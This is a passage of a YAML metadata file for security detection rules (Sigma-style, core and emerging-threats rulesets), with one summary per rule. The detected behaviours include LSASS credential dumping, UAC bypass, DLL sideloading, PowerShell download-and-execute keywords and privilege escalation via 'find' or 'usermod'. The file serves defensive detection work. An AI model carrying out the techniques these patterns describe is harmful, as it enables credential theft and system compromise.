    Windows registry, specifically targeting the `\Outlook\Security\EnableUnsafeClientMailRules`
    registry object and the DWORD value indicating it has been enabled.
  Updated-Date: '2024_09_03'
678eb5f4-8597-4be6-8be7-905e4234b53a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 076b57931ff28b40a5d95255bc4bb110
  Ruleset: emerging-threats
  Summary: This rule detects exploits that leverage CVE-2017-11882 to initiate EQNEDT32.EXE
    and associated subprocesses such as mshta.exe. This vulnerability is associated
    with Microsoft Office and can potentially allow malicious actors to execute arbitrary
    code by exploiting the Equation Editor component. Detection focuses on monitoring
    process creation activities specifically targeting the launch of EQNEDT32.EXE
    to identify potential misuse and prevent further compromise of the affected system.
  Updated-Date: '2024_09_03'
679085d5-f427-4484-9f58-1dc30a7c426d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 70f8792a7089027f2ab8d641d5e2dfd9
  Ruleset: core
  Summary: This rule detects the loading of the WinDivert driver, which is a versatile
    user-mode capture, sniffing, modification, blocking, and re-injection package
    for Windows systems. The detection focuses on specific file names such as '\WinDivert.sys'
    and '\WinDivert64.sys', along with several other aliases and matching image hashes.
    This driver is often associated with network traffic interception and can be used
    for both legitimate administrative purposes and malicious activities, such as
    bypassing security measures or facilitating certain types of network attacks.
  Updated-Date: '2024_09_03'
67a6c006-3fbe-46a7-9074-2ba3b82c3000:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8b1b58d4daea5993a916c0f9568d95f8
  Ruleset: sigmahq
  Summary: This rule detects modifications to the registry key that specifies the
    path to the binary used as a screensaver on Windows systems. Such changes could
    indicate attempts to achieve persistence or escalate privileges by malicious actors.
    The rule looks for alterations to the value that ends with `\Control Panel\Desktop\SCRNSAVE.EXE`
    and excludes the processes `rundll32.exe` and `explorer.exe` to reduce false positives.
  Updated-Date: '2024_09_04'
67add051-9ee7-4ad3-93ba-42935615ae8d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: aee8d0aa7d6f64c20c9c23724217a7a6
  Ruleset: core
  Summary: This rule detects the loading of a driver associated with the Process Hacker
    tool on Windows systems. Process Hacker is a powerful software utility used for
    process monitoring and management. The rule specifically identifies driver loads
    involving 'kprocesshacker.sys' or any processes exhibiting certain import function
    hashes (IMPHASH) tied to this tool. It aims to capture instances where the Process
    Hacker driver is being utilized, which may be indicative of privilege escalation
    activities or other unauthorized actions. Legitimate use by developers or system
    administrators could generate false positives.
  Updated-Date: '2024_09_03'
67bc0e75-c0a9-4cfc-8754-84a505b63c04:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: abca79c90b625ba64dddd73d2f2eef42
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious child processes spawned by a ClickOnce
    deployment application on Windows systems. It specifically looks for parent processes
    located in the '\AppData\Local\Apps\2.0\' directory and child processes that match
    a list of known executable files, such as 'calc.exe,' 'cmd.exe,' 'cscript.exe,'
    'explorer.exe,' 'mshta.exe,' 'net.exe,' 'net1.exe,' 'nltest.exe,' 'notepad.exe,'
    'powershell.exe,' 'pwsh.exe,' 'reg.exe,' 'regsvr32.exe,' 'rundll32.exe,' 'schtasks.exe,'
    'werfault.exe,' and 'wscript.exe.' This behavior may indicate attempts to execute
    trusted code in a malicious manner.
  Updated-Date: '2024_09_04'
67bce556-312f-4c81-9162-c3c9ff2599b2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 57b6cf09ab97916e3fd75c18e6d135a3
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts in Microsoft Exchange server logs
    related to the HAFNIUM group. It identifies suspicious web requests with specific
    characteristics, such as HTTP POST methods sent to directories associated with
    Exchange (e.g., `/owa/`, `/ecp/`). These requests may include unusual or known
    malicious user-agent strings and specific URL queries that indicate potential
    exploitation activities. The rule aims to flag any attempts to leverage zero-day
    vulnerabilities in Microsoft Exchange servers as detailed in reports about HAFNIUM's
    offensive operations. Potential false positives may arise from legitimate web
    application access that shares directory names with Exchange.
  Updated-Date: '2024_09_03'
67f113fa-e23d-4271-befa-30113b3e08b1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c37c2d5c497e69e1f62b60c7ae1e208c
  Ruleset: core
  Summary: This rule detects the execution of JavaScript code using the "mshta.exe"
    executable. The detection focuses on processes where the image ends with '\mshta.exe'
    or the original file name is 'MSHTA.EXE' and includes 'javascript' in the command
    line. This behavior is notable as it can be indicative of defense evasion tactics
    outlined in attack technique T1218.005.
  Updated-Date: '2024_09_03'
68050b10-e477-4377-a99b-3721b422d6ef:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d977a3d4b93ab2ef0ce14aa49013607c
  Ruleset: core
  Summary: This rule detects remote RPC calls that execute remote DCOM operations,
    which can be exploited for lateral movement using DCOM or WMI. Specifically, it
    monitors for RPC Firewall logs with certain event IDs and interface UUIDs commonly
    associated with DCOM operations. This activity can indicate an attempt to move
    laterally within a network using these protocols.
  Updated-Date: '2024_09_03'
6812a10b-60ea-420c-832f-dfcc33b646ba:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 21961a017e7503948ac6b4ea38bddb0e
  Ruleset: core
  Summary: This rule detects potential execution of PowerShell commands via Dynamic
    Link Libraries (DLLs) instead of the standard PowerShell process, which is a technique
    used by the PowerShdll tool. Detection is based on observing specific DLL-related
    executables, such as "InstallUtil.exe," "RegAsm.exe," "RegSvcs.exe," "regsvr32.exe,"
    and "rundll32.exe," executing PowerShell-specific commands in their command line
    arguments, such as "Default.GetString," "DownloadString," "FromBase64String,"
    "ICM," "IEX," "Invoke-Command," and "Invoke-Expression."
  Updated-Date: '2024_09_03'
68578b43-65df-4f81-9a9b-92f32711a951:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8afb9e0ffdd7b6fbc6968c5b1f1efc59
  Ruleset: core
  Summary: This rule detects the pattern of User Account Control (UAC) bypass using
    Windows Media Player's osksupport.dll, associated with the UACMe tool. The detection
    focuses on specific file paths and filenames, particularly targeting files within
    user directories that relate to osksupport.dll, and monitoring the execution of
    DllHost.exe with the target filename osk.exe in the Windows Media Player directory.
    This activity may indicate attempts at defense evasion and privilege escalation
    on Windows systems.
  Updated-Date: '2024_09_03'
68654bf0-4412-43d5-bfe8-5eaa393cd939:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fcf35d0044ea3bcb243ab4c6676435b3
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading by monitoring the loading of
    a specific DLL file named 'JSESPR.dll'. The activity involves the JUSTSYSTEMS
    Japanese word processor and aims to identify attempts to evade defenses, maintain
    persistence, or escalate privileges. The detection focuses on instances where
    'JSESPR.dll' is loaded, excluding cases where it loads from the legitimate directory
    'C:\Program Files\Common Files\Justsystem\JsSchHlp'. This could be indicative
    of malicious activity leveraging DLL sideloading techniques for unauthorized actions.
  Updated-Date: '2024_09_04'
686c0b4b-9dd3-4847-9077-d6c1bbe36fcb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2020b93710e0ccc64eeb8ada7a4d48fc
  Ruleset: core
  Summary: This rule detects the disabling of the Windows Defender virus scanning
    feature by monitoring for specific events, such as when Event ID 5012 is logged,
    indicating that scanning for viruses has been disabled.
  Updated-Date: '2024_09_03'
687f6504-7f44-4549-91fc-f07bab065821:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 50688dbb673f5163410db611d8b8b06e
  Ruleset: emerging-threats
  Summary: "This rule detects the exploitation of a vulnerability in Oracle WebLogic\
    \ Server identified as CVE-2021-2109. The threat uses specific GET requests that\
    \ contain certain URI query parameters pointing to 'com.bea.console.handles.JndiBindingHandle',\
    \ 'ldap://', and 'AdminServer'. This behavior indicates an attempt to exploit\
    \ the WebLogic server for initial unauthorized access. Key log fields monitored\
    \ include client IP and DNS to identify the potential threat. This detection method\
    \ aims to capture critical signs of compromise targeting the WebLogic server\u2019\
    s administration console."
  Updated-Date: '2024_09_03'
689308fc-cfba-4f72-9897-796c1dc61487:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 82598c854a7aa2cb1358d3ca204d0555
  Ruleset: emerging-threats
  Summary: This rule detects a distinct command line employed by the Conti ransomware
    group. Conti ransomware is notorious for its impact on infected systems, including
    data encryption and subsequent ransom demands. The rule monitors for specific
    command parameters that are indicative of Conti's operational patterns, such as
    flags related to file size and network paths. This approach helps in early identification
    and mitigation of potential Conti ransomware attacks on Windows systems.
  Updated-Date: '2024_09_03'
6897cd82-6664-11ed-9022-0242ac120002:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2fb72aebae6bcc3e9abb151376aff875
  Ruleset: sigmahq
  Summary: This rule detects when a user performs a PST export using the 'New-ComplianceSearchAction'
    with the '-Export' flag on Microsoft 365 platforms. It specifically targets activity
    within the Security Compliance Center and monitors for commands related to 'New-ComplianceSearchAction',
    'Export', and 'pst'. The detection is significant even if 'eDiscovery search or
    exported' alerts are disabled in Office 365. This rule applies to the usage of
    Exchange PowerShell from either local or cloud environments, and alerts on such
    actions due to the potential sensitivity of PST file contents.
  Updated-Date: '2024_09_04'
68bcd73b-37ef-49cb-95fc-edc809730be6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9d73f99c27d86a13d77788308b59b245
  Ruleset: sigmahq
  Summary: This rule detects the execution of "wmic.exe" with specific command line
    arguments that are used for reconnaissance of unquoted service paths on Windows
    systems. This technique, often utilized by pentesters and attackers, aims to enumerate
    services and identify those with unprotected paths that could be exploited for
    privilege escalation. The detection focuses on instances where "wmic.exe" is used
    to retrieve service information, including name, display name, pathname, and start
    mode.
  Updated-Date: '2024_09_04'
68d37776-61db-42f5-bf54-27e87072d17e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5c09ac27ee7c932c80098ca95ee15537
  Ruleset: core
  Summary: This rule detects the use of NPS, which is a port forwarding and intranet
    penetration proxy server. The detection criteria include the process creation
    of the executable "npc.exe" and specific command line arguments such as '-server=',
    '-vkey=', and '-password=' or '-config=npc'. Additionally, certain hashes related
    to version 0.26.10 of NPS are checked to confirm its presence. The rule aims to
    identify potential command-and-control activities linked to the use of this tunneling
    tool.
  Updated-Date: '2024_09_03'
6902955a-01b7-432c-b32a-6f5f81d8f625:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7284437ea8ff2e6edc21c222f92652dc
  Ruleset: core
  Summary: This rule detects the presence of an LSASS (Local Security Authority Subsystem
    Service) dump file in the "CrashDumps" folder, which may indicate credential dumping
    activity. LSASS credential dumping involves extracting passwords and other sensitive
    information from the LSASS process. The rule takes into account techniques like
    LSASS Shtinkering, which exploits Windows Error Reporting to create LSASS dump
    files. This activity is generally unusual and can be a sign of malicious intent.
  Updated-Date: '2024_09_03'
692f0bec-83ba-4d04-af7e-e884a96059b6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 493e1e7ce8ddeaaf39adf3193e9befc8
  Ruleset: sigmahq
  Summary: This rule detects instances where PowerShell is launched as a child process
    of WmiPrvSE.exe, which may indicate lateral movement using Windows Management
    Instrumentation (WMI). This behavior can be a sign of malicious activity, as WMI
    is often exploited by attackers to execute code remotely. The rule specifically
    looks for processes where WmiPrvSE.exe is the parent process and PowerShell (powershell.exe
    or pwsh.exe) is the spawned process. Common false positives include AppvClient,
    CCM, and WinRM, which can also spawn PowerShell under legitimate circumstances.
  Updated-Date: '2024_09_04'
6938366d-8954-4ddc-baff-c830b3ba8fcd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: de4c78073bffbcef6a56cc83edee6e6e
  Ruleset: core
  Summary: This rule detects the execution of Certipy, a tool used for enumerating
    and abusing Active Directory Certificate Services. It identifies Certipy based
    on its Portable Executable (PE) metadata characteristics, such as the image name
    "Certipy.exe" and command-line arguments that include specific terms like "auth,"
    "find," "forge," "relay," "req," and "shadow." Additionally, certain command-line
    flags like "-bloodhound," "-ca-pfx," "-dc-ip," and "-pfx" are also monitored.
    This combination of PE traits and specific command-line indicators allows for
    precise detection of Certipy usage in a Windows environment.
  Updated-Date: '2024_09_03'
693a44e9-7f26-4cb6-b787-214867672d3a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2c5ceb1a605b424de382b907923a91bf
  Ruleset: sigmahq
  Summary: This rule detects any Sysmon "FileExecutableDetected" event, which occurs
    each time a Portable Executable (PE) monitored by the configuration file is created
    on a Windows system. The rule is based on EventID 29 and is essential for identifying
    file creation events that might indicate defense evasion techniques.
  Updated-Date: '2024_09_04'
69483748-1525-4a6c-95ca-90dc8d431b68:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a810f0f93eb271c6fe2ed83de583cbc3
  Ruleset: core
  Summary: This rule detects the spawning of suspicious child processes from Microsoft
    Office suite applications on macOS, such as Word, Excel, PowerPoint, and OneNote.
    These child processes could include shells and scripting languages like bash,
    curl, osascript, and python, indicating potential malicious macro execution.
  Updated-Date: '2024_09_03'
696bfb54-227e-4602-ac5b-30d9d2053312:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8813ae4bdf51f7cf1be1297d5f7540cf
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious SQL queries executed using SQLCmd
    targeting the Veeam backup databases with the intention of stealing information.
    The rule identifies processes where the 'sqlcmd.exe' image is used in conjunction
    with specific command lines referencing Veeam backup components such as 'VeeamBackup',
    'BackupRepositories', 'Backups', 'Credentials', 'HostCreds', 'SmbFileShares',
    'Ssh_creds', and 'VSphereInfo'.
  Updated-Date: '2024_09_04'
698d4431-514f-4c82-af4d-cf573872a9f5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 872d80a9c3ef7a591ff332bb68b1e24c
  Ruleset: emerging-threats
  Summary: This rule detects system discovery activities attributed to Pikabot malware,
    which performs actions such as gathering network information, user details, and
    domain groups. It identifies the execution of commands like 'ipconfig.exe /all',
    'netstat.exe -aon', and 'whoami.exe /all' initiated by processes like 'rundll32.exe',
    'SearchFilterHost.exe', and 'SearchProtocolHost.exe'. This behavior is typically
    associated with Pikabot as part of its command-and-control botnet registration
    process, which occurs quickly, within less than one minute.
  Updated-Date: '2024_09_03'
6991bc2b-ae2e-447f-bc55-3a1ba04c14e5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1356bbde67868954be6b8d6d76120424
  Ruleset: sigmahq
  Summary: This rule detects instances where an FTP service on an OpenCanary node
    has had a login attempt. OpenCanary is a tool designed for network deception and
    intrusion detection by creating honeypot services. This detection focuses specifically
    on FTP services to identify unauthorized access attempts.
  Updated-Date: '2024_09_04'
69b3bd1e-b38a-462f-9a23-fbdbf63d2294:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fd93c91286c24f8969d909c2e51f738d
  Ruleset: sigmahq
  Summary: This rule detects changes to the policy for allowing forks of private and
    internal repositories on GitHub, whether the policy is enabled or cleared. These
    changes are significant as they can affect the accessibility and distribution
    of private code. The rule monitors audit logs for specific actions indicating
    that an enterprise owner has either enabled or cleared this policy setting for
    a repository, organization, or enterprise. This detection mechanism helps identify
    potential security risks associated with the unauthorized distribution of sensitive
    repository content.
  Updated-Date: '2024_09_04'
69bd9b97-2be2-41b6-9816-fb08757a4d1a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 90b40934b51cbef4c385eb561eb61c51
  Ruleset: core
  Summary: This rule detects a potentially suspicious execution where a parent process
    located in the "\Users\Public" folder initiates a child process that includes
    references to shell or scripting binaries and relevant command lines. These child
    processes include known executable files such as bitsadmin.exe, certutil.exe,
    cmd.exe, cscript.exe, mshta.exe, powershell.exe, pwsh.exe, regsvr32.exe, rundll32.exe,
    and wscript.exe. The presence of these scripting tools, often used for administrative
    tasks, linked to a public folder parent process may indicate malicious activity,
    such as the execution of scripts or commands for defense evasion or execution.
  Updated-Date: '2024_09_03'
69ca006d-b9a9-47f5-80ff-ecd4d25d481a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 85f9598dfc94943b9c3db8b5e03ec46e
  Ruleset: core
  Summary: This rule detects the execution of TruffleSnout.exe, a tool used for iterative
    Active Directory (AD) discovery by offensive operators. It provides situational
    awareness and targeted low noise enumeration, assisting in the identification
    of AD environments. The detection is based on the presence of processes with the
    original filename or image path ending in TruffleSnout.exe.
  Updated-Date: '2024_09_03'
69ca12af-119d-44ed-b50f-a47af0ebc364:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8dbcdd97e32ca3f84a183e7850d8ca29
  Ruleset: core
  Summary: This rule detects the creation of a file named "lsass.dmp" by the Task
    Manager (taskmgr.exe) process on Windows systems. This action signifies a manual
    dump of the LSASS.exe process memory via Windows Task Manager, which is typically
    used for credential access attacks. The specific log sources include the file
    event category on Windows systems, and the rule monitors for paths in the local
    temp directory containing "lsass" and ending with ".DMP." Any such detections
    should be investigated due to the high likelihood of malicious activity.
  Updated-Date: '2024_09_03'
6a50f16c-3b7b-42d1-b081-0fdd3ba70a73:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 239d391bfec0804546b94ff1bbed7b4c
  Ruleset: sigmahq
  Summary: This rule detects the use of the "usermod" binary to add users to either
    the root or sudoers groups on a Linux system. The detection focuses on process
    creation events where the command line includes arguments such as '-aG root' or
    '-aG sudoers,' indicating a modification attempt to enhance user privileges.
  Updated-Date: '2024_09_04'
6a53d871-682d-40b6-83e0-b7c1a6c4e3a5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 45559f1fa81555d2e5c9889213238506
  Ruleset: core
  Summary: This rule detects suspicious Kerberos Ticket Granting Ticket (TGT) requests
    associated with the PetitPotam attack method. After an attacker abuses Active
    Directory Certificate Services to obtain a computer certificate, they may use
    tools like Rubeus to leverage the certificate for malicious activity. Such activity
    generates Event ID 4768 with unusual fields, necessitating tuning by filtering
    the Account_Name to Domain Controller computer accounts. The rule monitors for
    instances where the target username ends with '$' and the certificate thumbprint
    contains specific patterns. This helps flag potentially malicious Kerberos TGT
    requests, aiding in the identification of credential-access threats.
  Updated-Date: '2024_09_03'
6a5f68d1-c4b5-46b9-94ee-5324892ea939:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e9bcf414e5bd9602a477b8ac5d8f4a3a
  Ruleset: core
  Summary: This rule detects the uninstallation of Sysinternals Sysmon, a system activity
    monitoring tool, which could indicate an attempt at defense evasion. It identifies
    instances where the Sysmon executable (either \Sysmon64.exe or \Sysmon.exe) initiates
    a command with options that include '-u', signaling an uninstall operation. Although
    legitimate administrators might utilize this command for debugging, its occurrence
    warrants high-level scrutiny due to potential misuse by malicious actors.
  Updated-Date: '2024_09_03'
6a69f62d-ce75-4b57-8dce-6351eb55b362:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3c72d2a357fa0824b842c27ca4c2bff9
  Ruleset: sigmahq
  Summary: This rule detects the use of the esentutl.exe utility to steal sensitive
    browser information from Internet Explorer and Microsoft Edge. This method is
    employed by the Qbot malware to extract and exploit stored browser data.
  Updated-Date: '2024_09_04'
6a7ba45c-63d8-473e-9736-2eaabff79964:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 96faa46be8fce3f61fab34f1c185f80e
  Ruleset: sigmahq
  Summary: This rule detects when an Amazon Web Services (AWS) Elastic File System
    (EFS) fileshare mount is modified or deleted. Such actions could indicate an adversary
    attempting to disrupt instances or applications utilizing the mounted file system
    by breaking the file system's integrity or availability.
  Updated-Date: '2024_09_04'
6aa12161-235a-4dfb-9c74-fe08df8d8da1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f5a27e129c7cc136d1b024952c8c4eb5
  Ruleset: sigmahq
  Summary: This rule detects changes to the Bitbucket audit log configuration. It
    monitors events categorized under 'Auditing' where the action taken is 'Audit
    log configuration updated'. This is important for identifying potential defense
    evasion tactics, as updates to audit log settings can obscure malicious activities
    or attempts to cover tracks.
  Updated-Date: '2024_09_04'
6aa1d992-5925-4e9f-a49b-845e51d1de01:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b7d784bd1a3490446ab63e5e0fcdcb50
  Ruleset: sigmahq
  Summary: This rule detects the addition of new dynamic-link libraries (DLLs) to
    the AppCertDlls registry key on a Windows system. The AppCertDlls value can be
    exploited for persistence and privilege escalation by causing a malicious DLL
    to load and execute within various processes on the computer. Monitoring changes
    to this registry key helps in identifying potentially harmful activities indicative
    of an attacker's attempt to maintain access or elevate privileges.
  Updated-Date: '2024_09_04'
6ad91e31-53df-4826-bd27-0166171c8040:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 91c1e46f9f516ddb397a7d2e9e82fa7b
  Ruleset: sigmahq
  Summary: This rule detects when an admission controller is executed in Google Cloud
    Platform (GCP) Kubernetes. Kubernetes admission controllers intercept and possibly
    modify requests to the Kubernetes API server, influenced by deployed admission
    webhooks like MutatingAdmissionWebhook or ValidatingAdmissionWebhook. These webhooks
    can be leveraged by adversaries to persist within the cluster through tactics
    such as modifying pod creation operations to insert malicious containers or intercepting
    API requests to capture access credentials, secrets, and other sensitive information.
  Updated-Date: '2024_09_04'
6adfbf8f-52be-4444-9bac-81b539624146:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4c2d385357948a6b61e94331da0424bd
  Ruleset: sigmahq
  Summary: This rule detects the usage of the 'find' command in Linux to execute a
    shell, which may indicate privilege escalation, unauthorized command execution,
    or an exploit attempt. The rule looks for processes where the 'find' command is
    executed with specific arguments and subsequently invokes common shell programs
    such as '/bin/bash', '/bin/sh', or similar interpreters. This behavior is potentially
    harmful and can be leveraged for malicious purposes.
  Updated-Date: '2024_09_04'
6ae53108-c3a0-4bee-8f45-c7591a2c337f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 44e359b4d62315a10def0c065b96b2bb
  Ruleset: sigmahq
  Summary: This rule detects an AppX package deployment that was blocked by an AppLocker
    policy. AppX packages are application distribution files used by Windows, and
    AppLocker is a security feature that restricts which applications can run. The
    detection is triggered by the specific event ID 412 in the AppXDeployment-Server
    service logs. The rule aims to identify instances where a deployment attempt is
    obstructed by the system's application control policies, which can be relevant
    for monitoring potential security incidents or configuration issues.
  Updated-Date: '2024_09_04'
6aef64e3-60c6-4782-8db3-8448759c714e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9667a10154796ceeeae2201aa9600b85
  Ruleset: sigmahq
  Summary: This rule detects when a role is modified or deleted in Google Workspace.
    It monitors events specifically from the admin.googleapis.com service, identifying
    actions such as DELETE_ROLE, RENAME_ROLE, and UPDATE_ROLE. This is crucial for
    tracking potential unauthorized changes within the Google Workspace environment.
  Updated-Date: '2024_09_04'
6af1617f-c179-47e3-bd66-b28034a1052d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1022fee010f9ec3abe7fefeb205855ba
  Ruleset: emerging-threats
  Summary: This rule detects file download requests made by the RomCom malware, potentially
    exploiting the CVE-2023-36884 vulnerability. It identifies specific HTTP GET requests
    for various file types such as URLs, VBS scripts, MHT files, ASP pages, and HTML
    redirection objects. These files are associated with command-and-control activities
    linked to RomCom's exploitation attempts. The detection parameters are set for
    proxy logs and focus on specific URI patterns indicative of this malicious activity.
  Updated-Date: '2024_09_03'
6b14bac8-3e3a-4324-8109-42f0546a347f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c9d5f491db7257f616d81f96b47e55b7
  Ruleset: sigmahq
  Summary: This rule detects the misuse of the cron utility in Linux to schedule tasks
    for the initial or recurring execution of malicious code. The detection focuses
    specifically on crontab jobs uploaded from the temporary (tmp) folder, a common
    tactic used to evade standard security measures and achieve persistence.
  Updated-Date: '2024_09_04'
6b269392-9eba-40b5-acb6-55c882b20ba6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1a19c087f52a5394384cce67dfd4013a
  Ruleset: sigmahq
  Summary: This rule detects the dropping of suspicious file types by an Exchange
    component running within Internet Information Services (IIS). It monitors for
    processes associated with `w3wp.exe` that include 'MSExchange' in their command
    line and identifies if files with extensions such as .aspx, .asp, .ashx, .ps1,
    .bat, .exe, .dll, or .vbs are being created. This behavior can indicate underlying
    security vulnerabilities or unauthorized activities, such as exploitation of specific
    Exchange vulnerabilities detailed in CVE-2022-41040 and CVE-2022-41082.
  Updated-Date: '2024_09_04'
6b369ced-4b1d-48f1-b427-fdc0de0790bd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 002bdf64cd35f687b692f1b3857f8b31
  Ruleset: sigmahq
  Summary: This rule detects the execution of Diantz.exe compressing a target file
    into a cab file stored within the Alternate Data Stream (ADS) of the target file,
    a technique often associated with defense evasion.
  Updated-Date: '2024_09_04'
6b65c28e-11f3-46cb-902a-68f2cafaf474:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6c013d36cdcd47069d14397b93eea673
  Ruleset: core
  Summary: This rule detects the execution of "odbcconf.exe" when the path of the
    DLL being registered is located in potentially suspicious directories. These directories
    include various system and temporary folders such as ':\PerfLogs\', ':\ProgramData\',
    ':\Temp\', ':\Users\Public\', and several locations within ':\Windows\System32\'
    and ':\Windows\SysWOW64\'. The detection focuses on command-line invocations of
    "odbcconf.exe" that reference DLLs in those paths, which may indicate malicious
    activity such as defense evasion tactics by adversaries.
  Updated-Date: '2024_09_03'
6b67c12e-5e40-47c6-b3b0-1e6b571184cc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2c5c4cb9131481f943873fbec2878d48
  Ruleset: sigmahq
  Summary: This rule detects when a service account is modified in Google Cloud. It
    identifies such changes through specific method names like patch, create, update,
    enable, and undelete in GCP audit logs. Modifications to service accounts can
    indicate alterations in permissions or configurations, which may be legitimate
    administrative activities or potentially unauthorized actions. Instances of unfamiliar
    users making these changes should be thoroughly investigated to differentiate
    between expected behavior and potential malicious activity.
  Updated-Date: '2024_09_04'
6b6976a3-b0e6-4723-ac24-ae38a737af41:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 00e29cc01a6877a8c1361d2a93cd8c09
  Ruleset: core
  Summary: This rule detects the installation of a new shim database when the file
    is located in a non-default location. Shim databases, which are used to apply
    compatibility fixes to applications, can be exploited by attackers for persistence
    mechanisms. This detection focuses on monitoring the Windows registry for the
    creation or modification of entries associated with shim databases in unconventional
    directories, indicating potential malicious activity attempting to maintain persistence
    on a compromised system.
  Updated-Date: '2024_09_03'
6b98b92b-4f00-4f62-b4fe-4d1920215771:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: aa28d462d4b4cefb7308b78651c0a97e
  Ruleset: core
  Summary: This rule detects the occurrence of DLL sideloading involving system DLLs
    that are not typically found on the system by default, specifically in system
    directories. This technique is commonly used to perform User Account Control (UAC)
    bypasses or to escalate privileges. It monitors the loading of specific DLLs within
    the Windows System32 directory, including `TSMSISrv.dll`, `TSVIPSrv.dll`, `wbemcomn.dll`,
    `WLBSCTRL.dll`, `wow64log.dll`, and `WptsExtensions.dll`. The rule aims to identify
    unauthorized DLLs when they are loaded, bypassing filters that check for valid
    Microsoft digital signatures.
  Updated-Date: '2024_09_03'
6ba5a05f-b095-4f0a-8654-b825f4f16334:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 15b9f7d13c3503ecab7cf0af65ea6097
  Ruleset: core
  Summary: This rule detects the potential hijacking of a Remote Desktop Protocol
    (RDP) session by identifying the use of MSTSC (Microsoft Terminal Services Client)
    shadowing with the 'noconsentprompt' option. Shadowing in this context allows
    one user to take control of another user's RDP session without their consent,
    which can be indicative of unauthorized lateral movement or session hijacking
    activities within a network.
  Updated-Date: '2024_09_03'
6bba49bf-7f8c-47d6-a1bb-6b4dece4640e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3883369a88248f8932b0d4d56f72a87b
  Ruleset: sigmahq
  Summary: This rule detects suspicious activity related to the process rasdial.exe,
    which is commonly used to establish Remote Access Service (RAS) connections on
    Windows systems. By monitoring the creation of this process, potential misuse
    for defense evasion or unauthorized command execution can be identified. The detection
    is based on the process creation logs that record instances where the image name
    ends with rasdial.exe.
